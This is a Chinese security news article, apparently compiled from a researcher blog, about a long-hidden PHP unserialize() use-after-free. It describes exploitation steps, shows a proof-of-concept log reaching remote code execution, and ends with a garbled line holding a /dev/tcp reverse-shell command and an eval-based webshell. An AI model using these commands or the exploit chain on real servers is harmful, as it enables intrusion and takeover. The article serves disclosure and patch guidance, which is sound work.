---
title: PHP中潜伏21年的致命漏洞：MAD Bugs详解
url: https://mp.weixin.qq.com/s/h4a1xFvqlNH4JMDNq9M-qg
source: Doonsec's feed
date: 2026-05-03
fetch_date: 2026-05-04T05:31:31.420858
---

# PHP中潜伏21年的致命漏洞：MAD Bugs详解

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0F39FxWeYDw0absKJ4GbIz2ibbDQvupxsUyJQzkOuGERiayDd8vCjGyrXc3YG54pWVqXEY5ZykjXjOVQXyfGE3heGjIT12cSI8Ss/0?wx_fmt=jpeg)

# PHP中潜伏21年的致命漏洞：MAD Bugs详解

Ots安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0HDNiaUBiaiawbqS1Zzich2KRSe52Rib3zibNVkL1aDvGRQhmlSB7RiaGqoppcYVqicrmfFTg6NwWWeSmOddtz1SJOPGAaaibicrgc4kLdzE/640?wx_fmt=jpeg&from=appmsg)

PHP中潜伏21年的致命漏洞：MAD Bugs详解近日，安全团队Calif.io发布了一篇技术博客，揭露了一个在PHP中隐藏了21年的严重漏洞。该漏洞被命名为“MAD Bugs”，主要影响unserialize()函数，可导致使用后释放（Use-After-Free，UAF）问题，最终可能实现远程代码执行（RCE）。这个漏洞自PHP 5.1（2005年）引入Serializable接口以来就存在，直至2026年才被发现。

漏洞成因漏洞的核心位于zend\_user\_unserialize()方法中对Serializable接口的处理。当处理可序列化对象时，代码路径没有正确递增BG(serialize\_lock)，导致嵌套调用unserialize()时，内外层共享同一个var\_hash表。攻击者精心构造Payload：

* 通过递归调用unserialize()并修改对象属性，触发属性表resize并释放内存。
* 使用堆喷射（spray）回收已释放的内存槽。
* 利用反向引用（R:N）解引用已释放的内存，实现内存破坏。

这一过程可进一步泄露堆地址、构建读原语、伪造对象（如Closure或stdClass），最终实现代码执行，例如调用system()函数。

影响范围与利用难度受影响版本：

* 从PHP 5.1到最新测试的PHP 8.5.5均存在该漏洞路径。
* 利用方式：本地利用约需30次触发即可RCE；远程利用针对接受用户输入并传入unserialize()的端点，约需2000次HTTP请求。利用绕过了disable\_functions，无需/proc访问或硬编码偏移。
* 实际风险：虽然需要特定的递归unserialize

反序列化+属性增长的类模式（现实中较少见），但一旦存在可控反序列化入口，后果极为严重。

修复与建议

PHP官方已通过在zend\_user\_unserialize()中添加BG(serialize\_lock)++来修复该问题。但PHP自2017年起将unserialize相关的内存破坏视为非安全问题，仅修复而不分配CVE，强烈推荐对不可信数据使用json\_decode()代替unserialize()。

Calif团队还开源了用于发现该漏洞的AI驱动审计工具（Skill），欢迎安全研究者进一步探索：https://github.com/califio/skills。这起事件再次提醒开发者：反序列化操作始终是高危来源，即使是成熟语言的核心功能，也可能潜藏长期隐患。建议立即检查代码中所有unserialize()的使用场景，并尽快升级到包含修复的PHP版本。（本文基于Calif.io官方博客编译，图片可参考原文中的技术示意图、利用流程图及PoC演示截图。）

原文链接：https://blog.calif.io/p/mad-bugs-finding-and-exploiting-a此漏洞的发现不仅是技术上的里程碑，也体现了AI在代码审计领域的强大潜力。开发者们，行动起来，保护好你们的PHP应用！

概念验证

在 linux/amd64 和 linux/arm64 平台上，使用 Docker 进行 3/3 次成功运行，php:8.5-apache并启用了完整的 ASLR，每次运行之间都重启了容器：

```
$ ./run_remote_poc.sh
[*] Container up; endpoint: http://127.0.0.1:8081/remote_app.php

============================================================
  Full chain: heap -> ELF -> EG -> system() -> RCE
  Target: 127.0.0.1:8081
============================================================

[Phase R-1] Heap leak
  heap_ref = 0xffffb6a58240

[Phase R-2] Finding libphp.so
  ELF @ 0xffffb7000000 phnum=8 (8 reqs)
  ELF @ 0xffffb7400000 phnum=9 (12 reqs)
  ...
  ELF @ 0xffffb8900000 phnum=9 (565 reqs)

[Phase R-3] Resolving symbols via .gnu_hash
  Trying ELF @ 0xffffb7400000 (phnum=9)
    symbol 'executor_globals' not found at 0xffffb7400000
  ...
  Trying ELF @ 0xffffb3400000 (phnum=8)
  libphp = 0xffffb3400000
  executor_globals = 0xffffb4b45888 (offset 0x1745888)
  PLTGOT = 0xffffb4a5ffe8

[Phase R-4] Libc discovery via GOT dump
    Reading GOT via DT_PLTRELSZ len=85392 (0x14d90)
    External pointer groups: 23 total, 18 nearby
      libc @ 0xffffb8690000, system @ 0xffffb86d9380
  system() = 0xffffb86d9380

[Phase R-5] EG and stdClass class entry
    class_table = 0xaaaaefae7bb0
  stdclass ce = 0xaaaaefbbf6d0

[Phase R-6] Spray slot discovery
  Found spray at slot 5 @ 0xffffb6a75640
  S = 0xffffb6a75658

[Phase R-7] Type confusion to libc system()
  stdClass ce = 0xaaaaefbbf6d0
  system() = 0xffffb86d9380
  Command (after GC_ADDREF): \nid>/dev/shm/x
  Sending RCE payload...

[*] Total requests: 2375

[*] Verifying inside container:
============================================================
  RCE SUCCESS: /dev/shm/x in php-uaf-poc
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
============================================================
```

对于任何更长的请求，该漏洞利用程序都会重复执行步骤 4。R-1 到 R-6 会发现所有 prefork 工作进程中都稳定的值（它们都从同一个父进程 fork 出来，因此 libphp、libc、堆块和喷洒槽在所有地方都位于相同的地址），所以一旦这些阶段完成，每增加一个 14 字节system()就相当于一次额外的请求。

它每次通过 DocumentRoot--reverse LHOST:LPORT组装三个字节，最后触发（约 25 次额外触发）；对写入操作执行相同的操作，然后触发（约 16 次触发）。

```
bash -i >&/dev/tcp/LHOST/LPORT 0>&1echo -n …>>wbash w&--webshell<?=eval($_REQUEST[1])?>mv w c.php
```

**END**

![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0Hk9qLVKL5OsaS9taAu6HPIAxVsIqtPaEyhCYTGSzxKCicNUZJM2hx5hiciaWZgicreB3r4tATEBTyxTwStdxIJlOCKepM5x7jPvRo/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址

排版 编辑 | Ots 小安

采集 翻译 | Ots Ai牛马

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

Ots安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过